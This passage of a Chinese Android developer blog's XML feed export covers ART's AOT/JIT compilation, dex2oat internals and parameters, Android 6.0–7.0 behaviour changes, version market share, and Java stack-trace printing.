href="#单纯的AOT存在的问题" class="headerlink" title="单纯的AOT存在的问题"></a>单纯的AOT存在的问题</h1><ol><li>应用安装时间长</li><li>系统更新后，要重新编译所有应用</li><li>浪费存储空间（为所有方法执行编译）</li></ol><h1 id="AOT-JIT"><a href="#AOT-JIT" class="headerlink" title="AOT+JIT"></a>AOT+JIT</h1><p>从Android 7.0（代号Nougat,简称N）开始，ART组合使用了AOT、JIT和配置文件引导型编译。所有这些编译模式的组合均可配置。例如，在Pixel设备上，相应的配置如下：</p><ol><li>最初在安装应用程序的时候不执行任何AOT编译。应用程序运行的前几次都将使用解释模式，<strong>并且经常执行的方法将被JIT编译</strong>。</li><li><strong>当设备处于空闲状态并正在充电时</strong>，编译守护进程会根据第一次运行期间生成的Profile文件对<strong>常用代码</strong>运行AOT编译。</li><li>应用程序的<strong>下一次重新启动将使用Profile文件引导的代码</strong>，并<strong>避免在运行时为已编译的方法进行JIT编译</strong>。在<strong>新运行期间得到JIT编译的方法将被添加到Profile文件中</strong>，然后被编译守护进程使用。</li></ol><p>ART包含一个编译器（dex2oat工具）和一个为启动zygote而加载的运行时（libart.so）。在应用程序安装时，APK文件会传递给dex2oat工具，该工具会为根据APK文件生成一个或多个编译产物，这些产物文件名和扩展名可能会在不同版本之间发生变化，但从Android 8.0版本开始，生成的文件是：</p><ul><li>.vdex：包含APK的未压缩Dex代码，以及一些额外的元数据用来加速验证。</li><li>.odex：包含APK中方法的AOT编译代码。（注意，虽然Dalvik虚拟机时代也会生成odex文件，但和这里的odex文件仅仅是后缀一样，文件内容已经完全不同了）</li><li>.art（可选）：包含APK中列出的一些字符串和类的ART内部表示，用于加速应用程序的启动    </li></ul><h1 id="编译选项"><a href="#编译选项" class="headerlink" title="编译选项"></a>编译选项</h1><p>ART的编译选项分为以下两个类别：</p><ol><li>系统ROM配置：编译系统映像时，会对哪些代码进行AOT编译。</li><li>运行时配置：ART如何在设备上编译和运行应用。</li></ol><p>用于配置这两个类别的一个核心ART选项就是”编译过滤器“，编译过滤器可控制ART如何编译DEX代码，是一个传递给dex2oat工具的选项。从Android 8.0开始，有四个官方支持的过滤器：</p><ol><li>verify：只运行DEX代码验证</li><li>quicken：运行DEX代码验证，并优化一些DEX指令，以获得更好的解释器性能。</li><li>speed：运行DEX代码验证，并对所有方法进行AOT编译。</li><li><p>speed-profile：运行DEX代码验证，并对配置文件中列出的方法进行AOT编译</p><h2 id="系统ROM配置"><a href="#系统ROM配置" class="headerlink" title="系统ROM配置"></a>系统ROM配置</h2><p>有一些编译选项可用于配置系统ROM，如何配置这些选项取决于/system的可用存储空间以及预先安装的应用数量。编译到系统AROM中的JAR/APK可以分为以下四个类别：</p><ol><li>启动类路径代码：默认使用speed编译过滤器进行编译 </li><li>系统服务代码：默认使用speed编译过滤器进行编译</li><li>产品专属的核心应用：默认使用speed编译过滤器进行编译</li><li>所有其他应用：默认使用quicken编译过滤器进行编译</li></ol></li></ol>]]></content>
      
      
      <categories>
          
          <category> ART虚拟机 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OAT </tag>
            
            <tag> JIT </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android逐步认识ART系列三</title>
      <link href="/2018/12/26/dex2oat%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"/>
      <url>/2018/12/26/dex2oat%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<p>dex2oat是将dex文件编译成Oat文件的工具，位于/system/bin/dex2oat</p><p>dex2oat生成的oat文件位于设备上/data/dalvik-cache/目录下,同时，由于32位和64位的机器码有所区别，因此这个目录下还会通过子文件夹对oat文件进行分类。例如，手机上通常会有下面两个目录：  </p><ul><li>/data/dalvik-cache/arm/  </li><li>/data/dalvik-cache/arm64/</li></ul><h1 id="dex2oat："><a href="#dex2oat：" class="headerlink" title="dex2oat："></a>dex2oat：</h1><ul><li>Retrieve classes.dex from APK (从apk中检索classes.dex)</li><li>verify each class（验证每个类）</li><li>verify each method（验证每个方法）</li><li>verify each dalvik instruction（验证每条dalvik指令）</li></ul><h1 id="dex2oat编译过程"><a href="#dex2oat编译过程" class="headerlink" title="dex2oat编译过程"></a>dex2oat编译过程</h1><p>依次编译输入参数中的所有dex文件;  每个dex文件又按照单个class进行编译; 对于每个class，依次编译其除abstract函数、\<cinit>之外的所有函数，包括 native（jni）/static/及一般函数，进行生成native code，并存放在compiler中。</cinit></p><p>当编译完成后，会从compiler中把native code， dex文件，以及必要的组织信息，写入到OAT文件中；如果指定了生成app-image，还会再生成一份 app-image文件。</p><h1 id="dex2oat的触发时机"><a href="#dex2oat的触发时机" class="headerlink" title="dex2oat的触发时机"></a>dex2oat的触发时机</h1><p>dex2oat进程的启动，可以分为两大类：一类是 installd进程触发的dex2oat；另一类是由 app中直接调用的dex2oat。</p><h2 id="installd中触发dex2oat有以下几个场景："><a href="#installd中触发dex2oat有以下几个场景：" class="headerlink" title="installd中触发dex2oat有以下几个场景："></a>installd中触发dex2oat有以下几个场景：</h2><pre><code>1. 应用安装，包括普通安装和通过shellCmd安装），安装一个app时，安装过程中需要编译dex文件，会通知installd来触发一个dex2oat进程。2. 开机扫描，开机过程中，PMS扫描已安装app过程，判断需要优化时，则会对install发出通知。3. BackgroundDexOptService，（空闲时段或者开机之后触发的Backgroud的 Job），会通知installd进行dex2oat4. OTADexoptService，好象是OAT过程中的触发的，这个场景没有进行过实际的验证</code></pre><h2 id="app中调用dex2oat"><a href="#app中调用dex2oat" class="headerlink" title="app中调用dex2oat"></a>app中调用dex2oat</h2><p>一般是App的进程fork出一个子进程，子进程用来执行dex2oat，编译相关的dex，而父进程进行 waitpid 等待，等待完成后再运行其他逻辑。<br>例如：  </p><ol><li>微信安装后的首次启动，是有dex2oat的调用</li><li>淘宝安装后的首次搜索，也有dex2oat的调用</li></ol><p>这个也是其首次启动或者搜索的一个耗时点。</p><p> 由系统触发的dex2oat，都是通过通知installd来进行编译业务。</p><p> 由应用触发的dex2oat，一般都是自行构建参数，直接调用dex2oat。</p><h1 id="compiler-backend-类型"><a href="#compiler-backend-类型" class="headerlink" title="compiler-backend 类型"></a>compiler-backend 类型</h1><ul><li>Portable</li><li>Quick</li><li><p>Optimizing</p><h2 id="Quick-Backend"><a href="#Quick-Backend" class="headerlink" title="Quick Backend"></a>Quick Backend</h2><blockquote><p>MIR -&gt; LIR -&gt; Native Code</p></blockquote><ul><li>Medium level IR(DEX ByteCode)</li><li>Low level IR</li><li>Native Code</li><li>some optimizations at each stage</li></ul><h2 id="Optimizing-Backend"><a href="#Optimizing-Backend" class="headerlink" title="Optimizing Backend"></a>Optimizing Backend</h2><ul><li>Basically Quick with additional optimizations</li></ul><h2 id="Portable-Backend"><a href="#Portable-Backend" class="headerlink" title="Portable Backend"></a>Portable Backend</h2><blockquote><p>MIR -&gt; LLVM Bitcode -&gt; LLVM optimizer -&gt; LLVM Backend -&gt; native code</p></blockquote><ul><li>Uses LLVM Bitcode as its LIR</li><li>Optimizations using LLVM optimizer</li><li>Code generation is done by LLVM backends</li></ul></li></ul><h1 id="编译优化条件和对象（没太搞明白的地方）"><a href="#编译优化条件和对象（没太搞明白的地方）" class="headerlink" title="编译优化条件和对象（没太搞明白的地方）"></a>编译优化条件和对象（没太搞明白的地方）</h1><h2 id="什么情况下App需要使用dex2oat进行编译优化"><a href="#什么情况下App需要使用dex2oat进行编译优化" class="headerlink" title="什么情况下App需要使用dex2oat进行编译优化?"></a>什么情况下App需要使用dex2oat进行编译优化?</h2><ul><li><p>Number of methods comprising 90% of called methods has changed by &gt; 10%.(被调用方法的比例若大于10%，则会触发dex2oat编译优化)</p><h2 id="若要使用dex2oat-哪些方法会被dex2oat考虑进去？"><a href="#若要使用dex2oat-哪些方法会被dex2oat考虑进去？" class="headerlink" title="若要使用dex2oat,哪些方法会被dex2oat考虑进去？"></a>若要使用dex2oat,哪些方法会被dex2oat考虑进去？</h2></li><li>Methods comprising 90% of called methods.()</li></ul><h1 id="dex2oat命令行参数"><a href="#dex2oat命令行参数" class="headerlink" title="dex2oat命令行参数"></a>dex2oat命令行参数</h1><p>example:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/system/bin/dex2oat --zip-fd=6 --zip-location=/system/app/</span><br><span class="line">Email.apk --oat-fd=7 --oat-location=/data/dalvik-cache/</span><br><span class="line">system@app@Email.apk@classes.dex --profile-file=/data/</span><br><span class="line">dalvik-cache/profiles/com.android.email</span><br></pre></td></tr></table></figure></p><p>参数说明：<br>–zip-fd=\<file-descriptor>:包含classes.dex文件的zip文件描述符。<br>–oat-fd=\<number>:通过此文件描述符指定输出的oat文件的路径。<br>–oat-location=\<oat-name>:指定一个与–oat-fd指定的文件描述符相对应的象征性名字。<br>–profile-file：引导dex2oat编译优化的配置文件。文件位置：/data/dalvik-cache/profiles/应用包名</oat-name></number></file-descriptor></p><p>其他重要参数说明(参考android7.0.0源码)：<br>-j\<number>:指定进行编译优化时要用到的线程总数。默认根据硬件适配，例如：-j12<br>–dex-file=\<dex-file>:指定要编译的文件，后缀可以是.dex、.jar、.apk，例如：–dex-file=/system/framework/core.jar<br>–dex-location=\<dex-location>:dex文件路径,与–dex-file相对应，例如：–dex-file=/home/build//out/system/framework/core.jar;–dex-location=/system/framework/core.jar。<br>–zip-location=\<zip-location>:zip文件路径。例如：–zip-location=/system/app/Calculator.apk<br>–oat-file=\&lt;file.oat&gt;:输出的oat文件名。例如：–oat-file=/system/framework/boot.oat。<br>–oat-symbols=\&lt;file.oat&gt;:指定输出完整符号的oat路径。例如：–oat-symbols=/symbols/system/framework/boo.art。<br>–instruction-set=(arm|arm64|mips|mips64|x86|x86_64):指定指令集架构类型，默认为arm。<br>–compile-backend=(Quick|Optimizing):指定编译器后端。默认为Optimizing。<br>–compiler-filter=(verify-none|verify-at-runtime|verify-profile|interpret-only|time|space-profile|space|balanced|speed-profile|speed|everything-profile|everything):指定编译器过滤模式，默认为speed。</zip-location></dex-location></dex-file></number></p><h1 id="dex2oat主要流程"><a href="#dex2oat主要流程" class="headerlink" title="dex2oat主要流程"></a>dex2oat主要流程</h1><p>main函数入口：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">int main(int argc, char** argv) &#123;</span><br><span class="line">  int result = art::dex2oat(argc, argv);</span><br><span class="line">  // Everything was done, do an explicit exit here to avoid running Runtime destructors that take</span><br><span class="line">  // time (bug 10645725) unless we&apos;re a debug build or running on valgrind. Note: The Dex2Oat class</span><br><span class="line">  // should not destruct the runtime in this case.</span><br><span class="line">  if (!art::kIsDebugBuild &amp;&amp; (RUNNING_ON_MEMORY_TOOL == 0)) &#123;</span><br><span class="line">    exit(result);</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>dex2oat函数入口：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">static int dex2oat(int argc, char** argv) &#123;</span><br><span class="line">  b13564922();</span><br><span class="line">    </span><br><span class="line">  TimingLogger timings(&quot;compiler&quot;, false, false);</span><br><span class="line"></span><br><span class="line">  // Allocate `dex2oat` on the heap instead of on the stack, as Clang</span><br><span class="line">  // might produce a stack frame too large for this function or for</span><br><span class="line">  // functions inlining it (such as main), that would not fit the</span><br><span class="line">  // requirements of the `-Wframe-larger-than` option.</span><br><span class="line">  std::unique_ptr&lt;Dex2Oat&gt; dex2oat = MakeUnique&lt;Dex2Oat&gt;(&amp;timings);</span><br><span class="line"></span><br><span class="line">  // Parse arguments. Argument mistakes will lead to exit(EXIT_FAILURE) in UsageError.</span><br><span class="line">  dex2oat-&gt;ParseArgs(argc, argv);</span><br><span class="line"></span><br><span class="line">  // If needed, process profile information for profile guided compilation.</span><br><span class="line">  // This operation involves I/O.</span><br><span class="line">  if (dex2oat-&gt;UseProfileGuidedCompilation()) &#123;</span><br><span class="line">    if (!dex2oat-&gt;LoadProfile()) &#123;</span><br><span class="line">      LOG(ERROR) &lt;&lt; &quot;Failed to process profile file&quot;;</span><br><span class="line">      return EXIT_FAILURE;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // Check early that the result of compilation can be written</span><br><span class="line">  if (!dex2oat-&gt;OpenFile()) &#123;</span><br><span class="line">    return EXIT_FAILURE;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // Print the complete line when any of the following is true:</span><br><span class="line">  //   1) Debug build</span><br><span class="line">  //   2) Compiling an image</span><br><span class="line">  //   3) Compiling with --host</span><br><span class="line">  //   4) Compiling on the host (not a target build)</span><br><span class="line">  // Otherwise, print a stripped command line.</span><br><span class="line">  if (kIsDebugBuild || dex2oat-&gt;IsBootImage() || dex2oat-&gt;IsHost() || !kIsTargetBuild) &#123;</span><br><span class="line">    LOG(INFO) &lt;&lt; CommandLine();</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    LOG(INFO) &lt;&lt; StrippedCommandLine();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  if (!dex2oat-&gt;Setup()) &#123;</span><br><span class="line">    dex2oat-&gt;EraseOatFiles();</span><br><span class="line">    return EXIT_FAILURE;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  bool result;</span><br><span class="line">  if (dex2oat-&gt;IsImage()) &#123;//App Image 或者Boot Image</span><br><span class="line">    result = CompileImage(*dex2oat);</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    result = CompileApp(*dex2oat);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  dex2oat-&gt;Shutdown();</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><blockquote><p>当使用profile-guide 编译app时，会先 LoadProfile(),进行解析出 class index 和 method index，放到 ProfileCompilationinfo 中;<br>如果当前的编译要生成 image时，走CompileImage流程，否则走CompileApp流程;</p></blockquote><p>不论是编译image还是App都会包含以下一个工作：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">dex2oat.Compile();//核心</span><br><span class="line"></span><br><span class="line">dex2oat.WriteOatFiles();//嵌入ELF</span><br><span class="line"></span><br><span class="line">dex2oat.FlushCloseOatFiles();</span><br><span class="line"></span><br><span class="line"> dex2oat.DumpTiming()</span><br></pre></td></tr></table></figure></p><p>CompileApp和CompileImage的区别是：</p><ol><li>编译image时需要 LoadClassProfileDescriptors() 产生 image_classes_ 集合，和生成 image（HandleImage()）;</li><li>在生成的app image中将会包含 image_classes_ 集合中类的对象，不在 image_classes_集合中的app的类的对象，将不会被生成到 app-image中。</li><li>LoadClassProfileDescriptors（）在从 profile信息中获取 image_classes_集合时，将会把 app dex 中的类以外的类，都过滤掉，比如 classpath dex 对应的类将不会生成到 app-image;</li></ol><p>dex2oat工作流程总结：</p><ol><li>根据dex2oat接收到的参数，组织编译参数</li><li>如果是 profile-guide 编译，则先进行 load app对应的 profile</li><li>收集参数中包含的所有dex file，启动 Compiler 编译这些dex file（classpath中对应的dex file，即uses-library 引用的jar文件，不会被编译），编译生成的数据放在compiler-driver中</li><li>使用 compiler-driver 中的数据，依据 oat文件设计的格式，组织成oat文件，嵌入到 ELF文件中</li><li>如果指定需要生成 app-image，则使用 HandleImage()， 生成app-image， 即 ***.art 文件</li></ol><h2 id="编译流程"><a href="#编译流程" class="headerlink" title="编译流程"></a>编译流程</h2>]]></content>
      
      
      <categories>
          
          <category> ART虚拟机 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> dex2oat </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android 部分系统版本变更行为</title>
      <link href="/2018/12/26/Android-%E9%83%A8%E5%88%86%E7%B3%BB%E7%BB%9F%E7%89%88%E6%9C%AC%E5%8F%98%E6%9B%B4%E8%A1%8C%E4%B8%BA/"/>
      <url>/2018/12/26/Android-%E9%83%A8%E5%88%86%E7%B3%BB%E7%BB%9F%E7%89%88%E6%9C%AC%E5%8F%98%E6%9B%B4%E8%A1%8C%E4%B8%BA/</url>
      
        <content type="html"><![CDATA[<p><strong>主要关注安全方面</strong></p><h1 id="Android-6-0部分变更行为："><a href="#Android-6-0部分变更行为：" class="headerlink" title="Android 6.0部分变更行为："></a>Android 6.0部分变更行为：</h1><ul><li>运行时权限</li></ul><p>此版本引入了一种新的权限模式，如今，用户可直接在运行时管理应用权限。这种模式让用户能够更好地了解和控制权限，同时为应用开发者精简了安装和自动更新过程。用户可为所安装的各个应用分别授予或撤销权限。</p><ul><li>低电耗模式和应用待机模式</li></ul><p>此版本引入了针对空闲设备和应用的最新节能优化技术。</p><ul><li>低电耗模式：如果用户拔下设备的电源插头，并在屏幕关闭后的一段时间内使其保持不活动状态，设备会进入低电耗模式，在该模式下设备会尝试让系统保持休眠状态。在该模式下，设备会定期短时间恢复正常工作，以便进行应用同步，还可让系统执行任何挂起的操作。</li><li>应用待机模式：应用待机模式允许系统判定应用在用户未主动使用它时处于空闲状态。当用户有一段时间未触摸应用时，系统便会作出此判定。如果拔下了设备电源插头，系统会为其视为空闲的应用停用网络访问以及暂停同步和作业。</li></ul><ul><li>取消支持 Apache HTTP 客户端</li></ul><p>Android 6.0 版移除了对 Apache HTTP 客户端的支持。如果您的应用使用该客户端，并以 Android 2.3（API 级别 9）或更高版本为目标平台，请改用 HttpURLConnection 类。此 API 效率更高，因为它可以通过透明压缩和响应缓存减少网络使用，并可最大限度降低耗电量。要继续使用 Apache HTTP API，您必须先在 build.gradle 文件中声明以下编译时依赖项：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">android &#123;</span><br><span class="line">    useLibrary &apos;org.apache.http.legacy&apos;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><ul><li>Boring SSL</li></ul><p>Android 正在从使用 OpenSSL 库转向使用 BoringSSL 库。如果您要在应用中使用 Android NDK，请勿链接到并非 NDK API 组成部分的加密库，如 libcrypto.so 和 libssl.so。这些库并非公共 API，可能会在不同版本和设备上毫无征兆地发生变化或出现故障。此外，您还可能让自己暴露在安全漏洞的风险之下。请改为修改原生代码，以通过 JNI 调用 Java 加密 API，或静态链接到您选择的加密库。</p><ul><li>运行时</li></ul><p>ART 运行时环境现在可正确实现 newInstance() 方法的访问规则。此变更修正了之前版本中 Dalvik 无法正确检查访问规则的问题。如果您的应用使用 newInstance() 方法，并且您想重写访问检查，请调用 setAccessible() 方法（将输入参数设置为 true）。如果您的应用使用 v7 appcompat 库或 v7 recyclerview 库，则您必须更新应用以使用这些库的最新版本。否则，请务必更新从 XML 引用的任何自定义类，以便能够访问它们的类构造函数。</p><p>此版本更新了动态链接程序的行为。动态链接程序现在可以识别库的 soname 与其路径之间的差异（公开错误 6670），并且现在已实现了按 soname 搜索。之前包含错误的 DT_NEEDED 条目（通常是开发计算机文件系统上的绝对路径）却仍工作正常的应用，如今可能会出现加载失败。</p><p>现已正确实现 dlopen(3) RTLD_LOCAL 标记。请注意，RTLD_LOCAL 是默认值，因此不显式使用 RTLD_LOCAL 的 dlopen(3) 调用将受到影响（除非您的应用显式使用 RTLD_GLOBAL）。使用 RTLD_LOCAL 时，在随后通过调用 dlopen(3) 加载的库中并不能使用这些符号（这与由 DT_NEEDED 条目引用的情况截然不同）。</p><p>在之前版本的 Android 上，如果您的应用请求系统加载包含文本重定位信息的共享库，系统会显示警告，但仍允许加载共享库。从此版本开始，如果您的应用的目标 SDK 版本为 23 或更高，则系统会拒绝加载该库。为帮助您检测库是否加载失败，您的应用应该记录 dlopen(3) 失败日志，并在日志中加入 dlerror(3) 调用返回的问题描述文本。要详细了解如何处理文本重定位，请参阅此指南。</p><ul><li>APK验证</li></ul><p>该平台现在执行的 APK 验证更为严格。如果在清单中声明的文件在 APK 中并不存在，该 APK 将被视为已损坏。移除任何内容后必须重新签署 APK。</p><h1 id="Android-7-0部分变更行为："><a href="#Android-7-0部分变更行为：" class="headerlink" title="Android 7.0部分变更行为："></a>Android 7.0部分变更行为：</h1><ul><li>配置文件指导的 JIT/AOT 编译</li></ul><p>在 Android 7.0 中，我们添加了即时 (JIT) 编译器，对 ART 进行代码分析，让它可以在应用运行时持续提升 Android 应用的性能。JIT 编译器对 Android 运行组件当前的 Ahead of Time (AOT) 编译器进行了补充，有助于提升运行时性能，节省存储空间，加快应用更新和系统更新速度。</p><p>配置文件指导的编译让 Android 运行组件能够根据应用的实际使用以及设备上的情况管理每个应用的 AOT/JIT 编译。例如，Android 运行组件维护每个应用热方法的配置文件，并且可以预编译和缓存这些方法以实现最佳性能。对于应用的其他部分，在实际使用之前不会进行编译。</p><p>除提升应用的关键部分的性能外，配置文件指导的编译还有助于减少整个 RAM 占用，包括关联的二进制文件。此功能对于低内存设备非常尤其重要。</p><p>Android 运行组件在管理配置文件指导的编译时，可最大程度降低对设备电池的影响。仅当设备处于空闲状态和充电时才进行编译，从而可以通过提前执行该工作节约时间和省电。</p><ul><li>快速的应用安装路径</li></ul><p>Android 运行组件的 JIT 编译器最实际的好处之一是应用安装和系统更新的速度。即使在 Android 6.0 中需要几分钟进行优化和安装的大型应用，现在只需几秒钟就可以完成安装。系统更新也变得更快，因为省去了优化步骤</p><p><strong>关于JIT的回归</strong></p><p>在Android 5.0上，系统在安装APK时会直接将dex文件中的代码编译成机器码。编译一个应用就已经很耗时，若编译所有应用，等待时间将会使人难以忍受。</p><p>例如：<br>应用程序编译生成的OAT文件会引用Framework中的代码。一旦系统发生升级，Framework中的实现发生变化，就需要重新修正所有应用程序的OAT文件，使得它们的引用是正确的，这就需要重新编译所有的应用。</p><p>由此可以看到单纯的AOT编译会存在以下问题：</p><ul><li>应用安装时间过长。</li><li>系统每次更新都要重新编译所有应用。</li><li>编译生成的Oat文件中，既包含了原先的Dex文件，又包含了编译后的机器代码。而实际上，对于用户来说，并非会用到应用程序中的所有功能，因此很多时候编译生成的机器码是一直用不到的。一份数据存在两份结果（尽管它们的格式是不一样的）显然是一种存储空间的浪费。</li></ul><p>因此，为了解决上述问题，Android 7.0(代号Nougat,简称N)中添加了JIT编译器和配置文件引导型编译。JIT和AOT的配合，是取两者之长，避两者之短：在APK安装时，并不是一次性将所有代码全部编译成机器码。而是在实际运行过程中，对代码进行分析，将热点代码编译成机器码，让它可以在应用运行时持续提升 Android 应用的性能。</p><p>JIT编译器补充了ART当前的预先AOT编译器的功能，有助于提高运行时性能，节省存储空间，以及加快应用及系统更新速度。相较于 AOT编译器，JIT编译器的优势也更为明显，因为它不会在应用自动更新期间或重新编译应用（在无线下载 OTA 更新期间）时拖慢系统速度。</p><p>尽管JIT和AOT使用相同的编译器，它们所进行的一系列优化也较为相似，但它们生成的代码可能会有所不同。JIT会利用运行时类型信息，可以更高效地进行内联，并可让堆栈替换 OnStackReplacement 编译成为可能，而这一切都会使其生成的代码略有不同。</p>]]></content>
      
      
      <categories>
          
          <category> Android版本相关 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android版本变化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android系统版本分布</title>
      <link href="/2018/12/26/Android%E7%B3%BB%E7%BB%9F%E7%89%88%E6%9C%AC%E5%88%86%E5%B8%83/"/>
      <url>/2018/12/26/Android%E7%B3%BB%E7%BB%9F%E7%89%88%E6%9C%AC%E5%88%86%E5%B8%83/</url>
      
        <content type="html"><![CDATA[<p>Android 信息中心：<a href="https://developer.android.com/about/dashboards/?hl=zh-cn" target="_blank" rel="noopener">https://developer.android.com/about/dashboards/?hl=zh-cn</a></p><p>Android各个系统版本市场占有率表：<br><img src="https://note.youdao.com/yws/api/personal/file/WEB9c984ab2b3606d4f688dee72ff7fb30f?method=download&amp;shareKey=288a168344f4c3da4e4930c699d19ee2" alt="image"><br>Android各个系统版本市场占有率图：<br><img src="https://note.youdao.com/yws/api/personal/file/WEB75a72b0c1a2257ce5215bc18bb38a8d4?method=download&amp;shareKey=cc627bcace397474e82ad2ad8355057c" alt="image"></p><p>总结，由上表和上图可知：</p><ul><li>Android6.0、Android7.0,7.1、Android8.0,8.1占据了3/4的Android市场。</li><li>单个系统版本市场占有率最高的为Android 6.0，即API 23 </li><li>复合系统版本市场占有率最高的为Android 7.0系列，其中7.0为18.1%，7.1为10.1%</li><li></li></ul>]]></content>
      
      
      <categories>
          
          <category> Android版本相关 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android系统版本分布 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java打印堆栈信息</title>
      <link href="/2018/12/26/Java-%E6%89%93%E5%8D%B0%E5%A0%86%E6%A0%88%E4%BF%A1%E6%81%AF/"/>
      <url>/2018/12/26/Java-%E6%89%93%E5%8D%B0%E5%A0%86%E6%A0%88%E4%BF%A1%E6%81%AF/</url>
      
        <content type="html"><![CDATA[<p>#java打印堆栈信息</p><ul><li><p>在函数内部打印函数调用堆栈</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Log.d(TAG,Log.getStackTraceString(new Throwable()));</span><br></pre></td></tr></table></figure></li><li><p>出异常时打印当前堆栈</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">try&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">catch(Exception e)&#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>使用StackTraceElement[]打印</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Throwable ex = new Throwable();</span><br><span class="line">StackTraceElement[] stackElements = ex.getStackTrace();</span><br><span class="line">if (stackElements != null) &#123;</span><br><span class="line">    for (int i = 0; i &lt; stackElements.length; i++) &#123;</span><br><span class="line">        System.out.print(stackElements[i].getClassName()+&quot;/t&quot;);</span><br><span class="line">        System.out.print(stackElements[i].getFileName()+&quot;/t&quot;);</span><br><span class="line">        System.out.print(stackElements[i].getLineNumber()+&quot;/t&quot;);</span><br><span class="line">        System.out.println(stackElements[i].getMethodName());</span><br><span class="line">        System.out.println(&quot;-----------------------------------&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>使用Thread打印</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Thread.currentThread().getStackTrace()</span><br></pre></td></tr></table></figure></li><li><p>使用exception打印</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Exception e = new Exception(&quot;this is a log&quot;);</span><br><span class="line">e.printStackTrace();</span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java堆栈 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android oat文件格式</title>
      <link href="/2018/12/26/Oat%E6%96%87%E4%BB%B6%E5%88%86%E6%9E%90/"/>
      <url>/2018/12/26/Oat%E6%96%87%E4%BB%B6%E5%88%86%E6%9E%90/</url>
      
